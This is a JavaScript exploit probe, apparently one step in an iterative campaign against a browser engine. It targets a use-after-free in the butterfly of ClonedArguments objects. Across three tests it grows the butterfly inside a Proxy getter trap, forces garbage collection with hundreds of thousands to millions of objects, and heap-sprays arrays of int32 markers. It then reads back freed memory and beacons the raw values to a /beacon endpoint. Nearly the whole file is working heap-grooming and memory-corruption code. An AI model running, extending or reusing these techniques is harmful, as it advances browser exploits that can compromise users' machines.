// p250 — ClonedArguments butterfly UAF: force-free via massive GC pressure
//
// V222 failed with 150K GC objects. V221 showed corruption with 800K.
// Hypothesis: 800K triggers a full collection that either:
//   (a) overwrites the stale butterfly despite conservative scanning, OR
//   (b) actually frees it because the interior pointer isn't recognized
//
// This probe runs ALONE (no other probes on page) with V221-level pressure.
// Uses INT32 spray values for clean NaN-boxing detection.
//
// Beacon prefix: V250-

(function() {
  function BS(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open(body ? 'POST' : 'GET', '/beacon/V250-' + tag + '?t=' + Date.now(), false);
      x.send(body || null);
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var NARGS = 64;
  var HOLES = [5, 10, 15, 20, 25, 30];

  // ==== TEST A: V221-level GC pressure + INT32 JSArray spray ====
  try {
    BS('A-START');
    var trapCount = 0;
    var spray = [];

    var manyArgs = [];
    for (var a = 0; a < NARGS; a++) manyArgs.push(a + 1);
    var args = target.apply(null, manyArgs);

    for (var h = 0; h < HOLES.length; h++) delete args[HOLES[h]];
    BS('A-HOLES-' + HOLES.length);

    var trap = {
      get: function(t, prop) {
        trapCount++;
        if (trapCount > 1) return undefined;
        BS('A-TRAP-' + prop);

        // Step 1: Grow butterfly (forces new allocation for MarkedBlock butterfly)
        for (var j = 100; j < 1000; j++) args[j] = 0x41;
        BS('A-GREW');

        // Step 2: MASSIVE GC pressure — match V221 (800K objects)
        // Create 50 batches of 10K objects + 30 batches of 10K objects = 800K
        var gcJunk = [];
        for (var g = 0; g < 50; g++) {
          var batch = [];
          for (var k = 0; k < 10000; k++) {
            batch.push({x: k, y: String(k)});
          }
          gcJunk.push(batch);
        }
        gcJunk.length = 0;
        gcJunk = null;

        var gcJunk2 = [];
        for (var g2 = 0; g2 < 30; g2++) {
          var batch2 = [];
          for (var k2 = 0; k2 < 10000; k2++) {
            batch2.push({a: k2});
          }
          gcJunk2.push(batch2);
        }
        gcJunk2 = null;
        BS('A-GC-800K');

        // Step 3: INT32 spray — values that stay int32-indexed
        // Use 0x7EEF0000 | k (fits in signed int32: 2130378752 + k < 2^31)
        // NaN-boxed: 0xFFFE0000_7EEF00kk
        var SPRAY_MARKER = 0x7EEF0000;
        for (var s = 0; s < 6000; s++) {
          var a2 = new Array(NARGS);
          for (var f = 0; f < NARGS; f++) {
            a2[f] = SPRAY_MARKER | f;
          }
          spray.push(a2);
        }
        BS('A-SPRAY-' + spray.length);

        return undefined;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
    }

    if (result) {
      BS('A-LEN-' + result.length);

      // Check ALL 64 positions
      var markers = 0, originals = 0, undefs = 0, others = 0;
      var markerPos = [];
      var allVals = [];

      for (var r = 0; r < Math.min(result.length, NARGS); r++) {
        var v = result[r];
        if (typeof v === 'number') {
          var u = v >>> 0;
          if ((u >>> 16) === 0x7EEF) {
            markers++;
            markerPos.push(r + ':' + (u & 0xFFFF));
            allVals.push(r + '=M' + hex(u));
          } else if (v === (r + 1)) {
            originals++;
            allVals.push(r + '=O');
          } else {
            others++;
            var f64 = new Float64Array(1);
            f64[0] = v;
            var u32 = new Uint32Array(f64.buffer);
            allVals.push(r + '=X' + hex(u32[1]) + hex(u32[0]));
          }
        } else if (v === undefined) {
          undefs++;
          allVals.push(r + '=U');
        } else if (typeof v === 'object') {
          others++;
          allVals.push(r + '=OBJ');
        } else {
          others++;
          allVals.push(r + '=T' + typeof v);
        }
      }

      BS('A-MARKERS-' + markers + '-ORIG-' + originals + '-UNDEF-' + undefs + '-OTHER-' + others);
      if (markers > 0) {
        BS('A-MARKER-POS', markerPos.join(','));
        BS('A-HIT-CONFIRMED');
      }

      // Send all values in chunks
      var chunk = allVals.slice(0, 32).join(' ');
      BS('A-VALS1', chunk);
      chunk = allVals.slice(32).join(' ');
      BS('A-VALS2', chunk);

      // Detailed raw bytes at hole positions
      for (var h = 0; h < HOLES.length; h++) {
        var idx = HOLES[h];
        if (idx < result.length) {
          var val = result[idx];
          var f64 = new Float64Array(1);
          f64[0] = (typeof val === 'number') ? val : 0;
          var u32 = new Uint32Array(f64.buffer);
          BS('A-H' + idx + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof val);
        }
      }
    }
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST B: Even MORE pressure (2M objects) + spray ====
  try {
    BS('B-START');
    var bTrap = 0;
    var bSpray = [];

    var bArgs = [];
    for (var a = 0; a < NARGS; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);
    for (var h = 0; h < HOLES.length; h++) delete args2[HOLES[h]];

    var trap2 = {
      get: function(t, prop) {
        bTrap++;
        if (bTrap > 1) return undefined;
        BS('B-TRAP-' + prop);

        for (var j = 100; j < 1000; j++) args2[j] = 0x41;
        BS('B-GREW');

        // 2M objects — extreme pressure
        for (var round = 0; round < 4; round++) {
          var junk = [];
          for (var g = 0; g < 500000; g++) {
            junk.push({v: g});
          }
          junk.length = 0;
          junk = null;
        }
        BS('B-GC-2M');

        // Spray
        for (var s = 0; s < 8000; s++) {
          var a2 = new Array(NARGS);
          for (var f = 0; f < NARGS; f++) {
            a2[f] = 0x7AAF0000 | f;
          }
          bSpray.push(a2);
        }
        BS('B-SPRAY-' + bSpray.length);

        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 30));
    }

    if (result2) {
      BS('B-LEN-' + result2.length);
      var bMarkers = 0, bOrig = 0, bUndef = 0, bOther = 0;
      for (var r = 0; r < Math.min(result2.length, NARGS); r++) {
        var v = result2[r];
        if (typeof v === 'number') {
          var u = v >>> 0;
          if ((u >>> 16) === 0x7AAF) {
            bMarkers++;
          } else if (v === (r + 1)) {
            bOrig++;
          } else {
            bOther++;
          }
        } else if (v === undefined) {
          bUndef++;
        } else {
          bOther++;
        }
      }
      BS('B-MARKERS-' + bMarkers + '-ORIG-' + bOrig + '-UNDEF-' + bUndef + '-OTHER-' + bOther);

      // Hole positions
      for (var h = 0; h < HOLES.length; h++) {
        var idx = HOLES[h];
        if (idx < result2.length) {
          var val = result2[idx];
          var f64 = new Float64Array(1);
          f64[0] = (typeof val === 'number') ? val : 0;
          var u32 = new Uint32Array(f64.buffer);
          BS('B-H' + idx + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof val);
        }
      }
    }
  } catch (e) {
    BS('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST C: Pre-exhaust the 544-byte size class ====
  // Theory: if we fill the MarkedBlock containing the old butterfly,
  // the GC MUST sweep it to make room for spray arrays
  try {
    BS('C-START');
    var cTrap = 0;
    var cSpray = [];
    var preExhaust = [];

    // Pre-allocate many 64-element arrays to fill 544-byte blocks
    for (var p = 0; p < 5000; p++) {
      var pa = new Array(NARGS);
      pa[0] = p;
      preExhaust.push(pa);
    }
    BS('C-PREEXHAUST-' + preExhaust.length);

    var cArgs = [];
    for (var a = 0; a < NARGS; a++) cArgs.push(a + 1);
    var args3 = target.apply(null, cArgs);
    for (var h = 0; h < HOLES.length; h++) delete args3[HOLES[h]];

    // Release pre-exhaustion arrays so their butterfly memory is FREE
    preExhaust.length = 0;
    preExhaust = null;
    BS('C-RELEASED');

    var trap3 = {
      get: function(t, prop) {
        cTrap++;
        if (cTrap > 1) return undefined;
        BS('C-TRAP-' + prop);

        for (var j = 100; j < 1000; j++) args3[j] = 0x41;
        BS('C-GREW');

        // Moderate GC pressure to sweep freed pre-exhaust butterflies
        var junk = [];
        for (var g = 0; g < 200000; g++) junk.push({v: g});
        junk = null;
        BS('C-GC');

        // Spray into the now-free 544-byte cells
        for (var s = 0; s < 6000; s++) {
          var a2 = new Array(NARGS);
          for (var f = 0; f < NARGS; f++) {
            a2[f] = 0x6BBF0000 | f;
          }
          cSpray.push(a2);
        }
        BS('C-SPRAY-' + cSpray.length);

        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap3));

    var result3;
    try {
      result3 = receiver.apply(null, args3);
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 30));
    }

    if (result3) {
      BS('C-LEN-' + result3.length);
      var cMarkers = 0, cOrig = 0;
      for (var r = 0; r < Math.min(result3.length, NARGS); r++) {
        var v = result3[r];
        if (typeof v === 'number') {
          var u = v >>> 0;
          if ((u >>> 16) === 0x6BBF) cMarkers++;
          else if (v === (r + 1)) cOrig++;
        }
      }
      BS('C-MARKERS-' + cMarkers + '-ORIG-' + cOrig);

      for (var h = 0; h < HOLES.length; h++) {
        var idx = HOLES[h];
        if (idx < result3.length) {
          var val = result3[idx];
          var f64 = new Float64Array(1);
          f64[0] = (typeof val === 'number') ? val : 0;
          var u32 = new Uint32Array(f64.buffer);
          BS('C-H' + idx + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof val);
        }
      }
    }
  } catch (e) {
    BS('C-OUTER-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
